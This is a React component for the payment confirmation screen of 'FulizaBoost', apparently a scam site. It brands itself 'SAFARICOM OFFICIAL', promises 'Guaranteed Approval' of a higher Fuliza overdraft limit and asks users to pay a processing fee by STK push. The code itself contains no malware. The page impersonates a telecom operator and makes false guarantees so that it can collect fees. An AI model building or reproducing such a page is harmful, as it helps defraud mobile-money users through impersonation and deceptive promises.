import { useLocation, useNavigate } from "react-router-dom";
import "../styles/Confirmation.css";

const Confirmation = () => {
  const navigate = useNavigate();
  const { state } = useLocation();

  const { limit, fee, phone } = state || {};

  return (
    <main className="cf-container">
      {/* HEADER */}
      <div className="cf-header">
        <button className="back-btn" onClick={() => navigate(-1)}>
          ←
        </button>
        <span className="header-title">Confirmation</span>
      </div>

      {/* BRAND */}
      <div className="cf-brand">
        <div className="badge">● SAFARICOM OFFICIAL</div>
        <h1 className="title">FulizaBoost</h1>
        <p className="subtitle">
          Instant Limit Increase • Guaranteed Approval
        </p>
      </div>

      <hr />

      <h2 className="review-title">Review Request</h2>
      <p className="review-text">
        Please confirm your selection before we initiate the STK push.
      </p>

      {/* SUMMARY CARD */}
      <div className="summary-card">
        <div className="row">
          <span>New Limit</span>
          <strong className="green">
            Ksh {limit?.toLocaleString()}
          </strong>
        </div>

        <div className="row">
          <span>Processing Fee</span>
          <strong>Ksh {fee}</strong>
        </div>

        <hr />

        <div className="payment">
          <span className="label">PAYMENT PHONE</span>
          <p className="phone">
            <span className="dot" /> {phone}
          </p>
        </div>
      </div>

      {/* FOOTER */}
      <div className="cf-footer">
        <button className="pay-btn">
          Pay Ksh {fee} & Boost
        </button>
        <button
          className="cancel-btn"
          onClick={() => navigate("/")}
        >
          Cancel Request
        </button>
      </div>
    </main>
  );
};

export default Confirmation;
